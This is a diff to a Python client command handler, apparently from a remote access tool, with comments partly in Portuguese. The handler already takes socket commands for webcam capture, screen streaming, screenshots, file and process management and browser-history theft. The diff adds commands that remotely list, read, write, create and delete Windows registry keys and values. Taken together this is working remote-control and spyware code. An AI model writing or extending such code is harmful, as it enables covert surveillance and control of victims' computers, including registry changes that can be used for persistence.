@@ -14,8 +14,8 @@ from core.protocol import *
 logger = logging.getLogger("client.command_handler")
 class CommandHandler:
     def __init__(self, connector, system_manager, process_manager, screenshot_manager, 
-                 webcam_manager=None, screen_stream_manager=None, file_manager=None, 
-                 browser_history_manager=None):  # Adicionado browser_history_manager
+                webcam_manager=None, screen_stream_manager=None, file_manager=None, 
+                browser_history_manager=None, registry_manager=None):
         self.connector = connector
         self.system_manager = system_manager
         self.process_manager = process_manager
@@ -23,7 +23,8 @@ class CommandHandler:
         self.webcam_manager = webcam_manager
         self.screen_stream_manager = screen_stream_manager
         self.file_manager = file_manager
-        self.browser_history_manager = browser_history_manager  # Armazenar a referência
+        self.browser_history_manager = browser_history_manager
+        self.registry_manager = registry_manager  # Add registry manager
     def process_command(self, cmd_data):
         if len(cmd_data) != 4:
             self._process_legacy_command(cmd_data)
@@ -67,6 +68,18 @@ class CommandHandler:
             self._handle_screen_stream_stop_request()
         elif cmd == CMD_BROWSER_HISTORY_REQUEST:
             self._handle_browser_history_request()
+        elif cmd == CMD_REGISTRY_LIST:
+            self._handle_registry_list_request()
+        elif cmd == CMD_REGISTRY_READ:
+            self._handle_registry_read_request()
+        elif cmd == CMD_REGISTRY_WRITE:
+            self._handle_registry_write_request()
+        elif cmd == CMD_REGISTRY_DELETE_VALUE:
+            self._handle_registry_delete_value_request()
+        elif cmd == CMD_REGISTRY_CREATE_KEY:
+            self._handle_registry_create_key_request()
+        elif cmd == CMD_REGISTRY_DELETE_KEY:
+            self._handle_registry_delete_key_request()
         else:
             logger.warning(f"Comando desconhecido recebido: {cmd}")
     def _process_legacy_command(self, initial_data):
@@ -889,3 +902,173 @@ class CommandHandler:
                 logger.info(f"Mensagem de erro de histórico enviada: {error_message}")
         except Exception as e:
             logger.error(f"Erro ao enviar mensagem de erro de histórico: {str(e)}")
+    def _handle_registry_list_request(self):
+        try:
+            if not self.registry_manager:
+                logger.error("Registry manager not available")
+                self._send_registry_error_response(CMD_REGISTRY_LIST_RESPONSE, "Registry manager not available")
+                return
+            socket = self.connector.client_socket
+            if not socket:
+                logger.error("Socket not available")
+                return
+            size_data = socket.recv(4)
+            if not size_data or len(size_data) != 4:
+                logger.error("Error receiving parameters size")
+                return
+            data_size = struct.unpack('>I', size_data)[0]
+            params_data = socket.recv(data_size)
+            params = json.loads(params_data.decode('utf-8'))
+            hkey = params.get('hkey', '')
+            path = params.get('path', '')
+            logger.info(f"Listing registry key: {hkey}\\{path}")
+            result = self.registry_manager.list_keys(hkey, path)
+            response = json.dumps(result).encode('utf-8')
+            send_binary_command(socket, CMD_REGISTRY_LIST_RESPONSE, response)
+        except Exception as e:
+            logger.error(f"Error handling registry list request: {str(e)}")
+            self._send_registry_error_response(CMD_REGISTRY_LIST_RESPONSE, str(e))
+    def _handle_registry_read_request(self):
+        try:
+            if not self.registry_manager:
+                logger.error("Registry manager not available")
+                self._send_registry_error_response(CMD_REGISTRY_READ_RESPONSE, "Registry manager not available")
+                return
+            socket = self.connector.client_socket
+            if not socket:
+                logger.error("Socket not available")
+                return
+            size_data = socket.recv(4)
+            if not size_data or len(size_data) != 4:
+                logger.error("Error receiving parameters size")
+                return
+            data_size = struct.unpack('>I', size_data)[0]
+            params_data = socket.recv(data_size)
+            params = json.loads(params_data.decode('utf-8'))
+            hkey = params.get('hkey', '')
+            path = params.get('path', '')
+            name = params.get('name', '')
+            logger.info(f"Reading registry value: {hkey}\\{path}\\{name}")
+            result = self.registry_manager.read_value(hkey, path, name)
+            response = json.dumps(result).encode('utf-8')
+            send_binary_command(socket, CMD_REGISTRY_READ_RESPONSE, response)
+        except Exception as e:
+            logger.error(f"Error handling registry read request: {str(e)}")
+            self._send_registry_error_response(CMD_REGISTRY_READ_RESPONSE, str(e))
+    def _handle_registry_write_request(self):
+        try:
+            if not self.registry_manager:
+                logger.error("Registry manager not available")
+                self._send_registry_error_response(CMD_REGISTRY_WRITE_RESPONSE, "Registry manager not available")
+                return
+            socket = self.connector.client_socket
+            if not socket:
+                logger.error("Socket not available")
+                return
+            size_data = socket.recv(4)
+            if not size_data or len(size_data) != 4:
+                logger.error("Error receiving parameters size")
+                return
+            data_size = struct.unpack('>I', size_data)[0]
+            params_data = socket.recv(data_size)
+            params = json.loads(params_data.decode('utf-8'))
+            hkey = params.get('hkey', '')
+            path = params.get('path', '')
+            name = params.get('name', '')
+            data = params.get('data', '')
+            data_type = params.get('type', 'REG_SZ')
+            logger.info(f"Writing registry value: {hkey}\\{path}\\{name}")
+            result = self.registry_manager.write_value(hkey, path, name, data, data_type)
+            response = json.dumps(result).encode('utf-8')
+            send_binary_command(socket, CMD_REGISTRY_WRITE_RESPONSE, response)
+        except Exception as e:
+            logger.error(f"Error handling registry write request: {str(e)}")
+            self._send_registry_error_response(CMD_REGISTRY_WRITE_RESPONSE, str(e))
+    def _handle_registry_delete_value_request(self):
+        try:
+            if not self.registry_manager:
+                logger.error("Registry manager not available")
+                self._send_registry_error_response(CMD_REGISTRY_DELETE_VALUE_RESPONSE, "Registry manager not available")
+                return
+            socket = self.connector.client_socket
+            if not socket:
+                logger.error("Socket not available")
+                return
+            size_data = socket.recv(4)
+            if not size_data or len(size_data) != 4:
+                logger.error("Error receiving parameters size")
+                return
+            data_size = struct.unpack('>I', size_data)[0]
+            params_data = socket.recv(data_size)
+            params = json.loads(params_data.decode('utf-8'))
+            hkey = params.get('hkey', '')
+            path = params.get('path', '')
+            name = params.get('name', '')
+            logger.info(f"Deleting registry value: {hkey}\\{path}\\{name}")
+            result = self.registry_manager.delete_value(hkey, path, name)
+            response = json.dumps(result).encode('utf-8')
+            send_binary_command(socket, CMD_REGISTRY_DELETE_VALUE_RESPONSE, response)
+        except Exception as e:
+            logger.error(f"Error handling registry delete value request: {str(e)}")
+            self._send_registry_error_response(CMD_REGISTRY_DELETE_VALUE_RESPONSE, str(e))
+    def _handle_registry_create_key_request(self):
+        try:
+            if not self.registry_manager:
+                logger.error("Registry manager not available")
+                self._send_registry_error_response(CMD_REGISTRY_CREATE_KEY_RESPONSE, "Registry manager not available")
+                return
+            socket = self.connector.client_socket
+            if not socket:
+                logger.error("Socket not available")
+                return
+            size_data = socket.recv(4)
+            if not size_data or len(size_data) != 4:
+                logger.error("Error receiving parameters size")
+                return
+            data_size = struct.unpack('>I', size_data)[0]
+            params_data = socket.recv(data_size)
+            params = json.loads(params_data.decode('utf-8'))
+            hkey = params.get('hkey', '')
+            path = params.get('path', '')
+            logger.info(f"Creating registry key: {hkey}\\{path}")
+            result = self.registry_manager.create_key(hkey, path)
+            response = json.dumps(result).encode('utf-8')
+            send_binary_command(socket, CMD_REGISTRY_CREATE_KEY_RESPONSE, response)
+        except Exception as e:
+            logger.error(f"Error handling registry create key request: {str(e)}")
+            self._send_registry_error_response(CMD_REGISTRY_CREATE_KEY_RESPONSE, str(e))
+    def _handle_registry_delete_key_request(self):
+        try:
+            if not self.registry_manager:
+                logger.error("Registry manager not available")
+                self._send_registry_error_response(CMD_REGISTRY_DELETE_KEY_RESPONSE, "Registry manager not available")
+                return
+            socket = self.connector.client_socket
+            if not socket:
+                logger.error("Socket not available")
+                return
+            size_data = socket.recv(4)
+            if not size_data or len(size_data) != 4:
+                logger.error("Error receiving parameters size")
+                return
+            data_size = struct.unpack('>I', size_data)[0]
+            params_data = socket.recv(data_size)
+            params = json.loads(params_data.decode('utf-8'))
+            hkey = params.get('hkey', '')
+            path = params.get('path', '')
+            logger.info(f"Deleting registry key: {hkey}\\{path}")
+            result = self.registry_manager.delete_key(hkey, path)
+            response = json.dumps(result).encode('utf-8')
+            send_binary_command(socket, CMD_REGISTRY_DELETE_KEY_RESPONSE, response)
+        except Exception as e:
+            logger.error(f"Error handling registry delete key request: {str(e)}")
+            self._send_registry_error_response(CMD_REGISTRY_DELETE_KEY_RESPONSE, str(e))
+    def _send_registry_error_response(self, cmd, error_message):
+        try:
+            socket = self.connector.client_socket
+            if socket:
+                error_data = json.dumps({"error": error_message}).encode('utf-8')
+                send_binary_command(socket, cmd, error_data)
+                logger.error(f"Registry error sent: {error_message}")
+        except Exception as e:
+            logger.error(f"Error sending registry error message: {str(e)}")
